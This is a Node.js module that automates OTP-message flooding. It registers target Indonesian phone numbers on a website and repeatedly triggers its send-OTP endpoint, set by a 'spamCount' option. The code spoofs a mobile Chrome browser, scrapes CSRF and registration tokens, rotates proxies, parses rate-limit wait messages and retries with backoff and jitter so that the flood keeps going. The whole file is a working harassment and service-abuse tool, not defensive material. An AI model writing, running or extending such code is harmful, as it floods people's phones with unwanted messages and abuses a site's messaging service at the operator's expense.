const axios = require('axios');
const { wrapper } = require('axios-cookiejar-support');
const { CookieJar } = require('tough-cookie');
const { HttpsProxyAgent } = require('https-proxy-agent');
const config = require('./config');
const logger = require('./logger');

const BASE = config.BASE_URL;
const UA = config.USER_AGENT;
const CHROME = config.CHROME_VERSION;

const sleep = (ms) => new Promise(r => setTimeout(r, ms));
const jitter = (ms) => Math.floor(ms * (0.7 + Math.random() * 0.6));
const backoff = (attempt) => Math.min(1000 * 2 ** attempt, 30000);

function buildClient(proxyUrl) {
  const jar = new CookieJar();
  const options = {
    jar,
    withCredentials: true,
    timeout: config.HTTP_TIMEOUT_MS,
    validateStatus: () => true,
    maxRedirects: 0,
    headers: {
      'User-Agent': UA,
      'Accept-Language': 'en-US,en;q=0.9,id-ID;q=0.8,id;q=0.7',
      'sec-ch-ua': `"Google Chrome";v="${CHROME}", "Not_A Brand";v="8", "Chromium";v="${CHROME}"`,
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'Origin': BASE,
      'Referer': `${BASE}/`,
    },
  };
  if (proxyUrl) {
    options.httpsAgent = new HttpsProxyAgent(proxyUrl);
    options.proxy = false;
  }
  return { client: wrapper(axios.create(options)), jar };
}

function extractToken(html) {
  if (!html || typeof html !== 'string') return null;
  const patterns = [
    /name=["']_token["']\s+value=["']([^"']+)["']/i,
    /name=["']_token["'][^>]*value=["']([^"']+)["']/i,
    /<meta[^>]+name=["']csrf-token["'][^>]+content=["']([^"']+)["']/i,
  ];
  for (const p of patterns) {
    const m = html.match(p);
    if (m && m[1] && m[1].length > 15) return m[1];
  }
  return null;
}

function extractRegisterTokens(html) {
  if (!html || typeof html !== 'string') return [];
  const tokens = new Set();
  const patterns = [
    /sendOtpRequest\(\s*["'][A-Z]+["']\s*,\s*["']([^"']{20,})["']\s*\)/g,
    /name=["']register_token["']\s+value=["']([^"']+)["']/g,
    /["']register_token["']\s*[:=]\s*["']([A-Za-z0-9._\-]{20,})["']/g,
  ];
  for (const p of patterns) {
    let m;
    while ((m = p.exec(html)) !== null) tokens.add(m[1]);
  }
  return [...tokens];
}

function parseWaitSeconds(body) {
  if (!body) return 65;
  const mMenit = body.match(/(\d+)\s*menit/i);
  const mDetik = body.match(/(\d+)\s*detik/i);
  let sec = 0;
  if (mMenit) sec += parseInt(mMenit[1], 10) * 60;
  if (mDetik) sec += parseInt(mDetik[1], 10);
  if (!sec) return 65;
  return Math.min(sec + 5, config.RATE_LIMIT_HARD_CAP_SEC);
}

async function getXsrf(jar) {
  const cookies = await jar.getCookies(BASE);
  const c = cookies.find(c => c.key === 'XSRF-TOKEN');
  if (!c) return '';
  try { return decodeURIComponent(c.value); } catch { return c.value; }
}

async function freshSession(client, jar) {
  let res;
  try {
    res = await client.get(`${BASE}/auth/verification-method`, {
      headers: {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
      },
    });
  } catch (e) {
    logger.warn(`freshSession network: ${e.code || e.message}`);
    return null;
  }
  const html = typeof res.data === 'string' ? res.data : '';
  const token = extractToken(html);
  const xsrf = await getXsrf(jar);
  if (!token) return null;
  return { token, xsrf };
}

function normalizePhone(raw) {
  const digits = String(raw).replace(/\D/g, '');
  if (!/^0?8\d{8,12}$/.test(digits)) return null;
  const local = digits.startsWith('0') ? digits.slice(1) : digits;
  return { local, full: '62' + local, display: '0' + local };
}

async function runOne(target, opts, proxyPool) {
  const { spamCount, delayOtp, maxRetry, types } = opts;
  const proxyUrl = proxyPool && proxyPool.length
    ? proxyPool[Math.floor(Math.random() * proxyPool.length)]
    : null;

  const result = {
    phone: target.display, ok: {}, failed: {}, error: null,
  };
  for (const t of types) { result.ok[t] = 0; result.failed[t] = 0; }

  const { client, jar } = buildClient(proxyUrl);

  let session = await freshSession(client, jar);
  if (!session) { result.error = 'init_failed'; return result; }

  const regBody = new URLSearchParams({
    _token: session.token,
    'phone-number': target.local,
    user_phone: target.full,
    phone_code: '62',
  }).toString();

  let regRes;
  try {
    regRes = await client.post(`${BASE}/auth/register`, regBody, {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'X-XSRF-TOKEN': session.xsrf,
        'Referer': `${BASE}/auth/verification-method`,
      },
    });
  } catch (e) {
    result.error = `register_network:${e.code || e.message}`;
    return result;
  }

  const locationRaw = regRes.headers.location || regRes.headers.Location;
  let html2 = typeof regRes.data === 'string' ? regRes.data : '';

  if (locationRaw) {
    const targetUrl = /^https?:\/\//i.test(locationRaw)
      ? locationRaw
      : locationRaw.startsWith('//')
        ? `https:${locationRaw}`
        : `${BASE}${locationRaw.startsWith('/') ? '' : '/'}${locationRaw}`;
    try {
      const page = await client.get(targetUrl, {
        headers: {
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Upgrade-Insecure-Requests': '1',
          'Sec-Fetch-Site': 'same-origin',
          'Sec-Fetch-Mode': 'navigate',
          'Sec-Fetch-User': '?1',
          'Sec-Fetch-Dest': 'document',
          'Referer': `${BASE}/auth/verification-method`,
        },
      });
      if (typeof page.data === 'string' && page.data.length) html2 = page.data;
    } catch (e) {
      logger.warn(`redirect fetch failed ${target.display}: ${e.code || e.message}`);
    }
  }

  const tokens2 = extractRegisterTokens(html2);
  if (!tokens2.length) { result.error = 'register_token_missing'; return result; }
  const registerToken = tokens2[0];

  const refreshed = await freshSession(client, jar);
  if (refreshed) session = refreshed;

  async function postOtp(type) {
    const body = new URLSearchParams({
      _token: session.token,
      type,
      register_token: registerToken,
    }).toString();
    return client.post(`${BASE}/auth/otp/send-otp-request`, body, {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Accept': '*/*',
        'X-XSRF-TOKEN': session.xsrf,
        'Referer': `${BASE}/auth/verification-method`,
      },
    });
  }

  for (const type of types) {
    let i = 1;
    while (i <= spamCount) {
      let attempt = 0;
      let advanced = false;

      while (!advanced) {
        let r;
        try {
          r = await postOtp(type);
        } catch (e) {
          attempt++;
          if (attempt > maxRetry) {
            result.failed[type]++;
            advanced = true;
            i++;
            break;
          }
          await sleep(backoff(attempt));
          continue;
        }

        const body = typeof r.data === 'string' ? r.data : JSON.stringify(r.data || '');

        if (r.status >= 200 && r.status < 300) {
          result.ok[type]++;
          attempt = 0;
          advanced = true;
          i++;
        } else if (r.status === 403) {
          attempt++;
          if (attempt > maxRetry) {
            result.failed[type]++;
            advanced = true;
            i++;
            break;
          }
          const wait = Math.max(parseWaitSeconds(body), backoff(attempt));
          await sleep(wait * 1000);
        } else if (r.status === 419 || r.status === 422) {
          if (attempt === 0) {
            const re = await freshSession(client, jar);
            if (re) session = re;
            attempt++;
            continue;
          }
          attempt++;
          if (attempt > maxRetry) {
            result.failed[type]++;
            advanced = true;
            i++;
            break;
          }
          await sleep(backoff(attempt));
        } else if (r.status >= 500) {
          attempt++;
          if (attempt > maxRetry) {
            result.failed[type]++;
            advanced = true;
            i++;
            break;
          }
          await sleep(backoff(attempt));
        } else {
          result.failed[type]++;
          advanced = true;
          i++;
        }
      }

      if (i <= spamCount) await sleep(jitter(delayOtp));
    }
  }

  return result;
}

module.exports = { runOne, normalizePhone };